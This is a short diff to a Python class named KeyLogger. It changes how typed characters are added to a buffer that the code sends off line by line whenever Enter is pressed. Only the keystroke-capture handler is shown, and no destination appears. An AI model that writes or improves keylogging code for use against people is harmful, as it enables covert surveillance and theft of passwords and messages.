@@ -11,7 +11,7 @@ class KeyLogger:
 
         def on_press(key):
             try:
-                self.line = self.line + key.char
+                self.line = self.line + str(key.char)
             except AttributeError:
                 if str(key) == "Key.enter":
                     self.sendline()
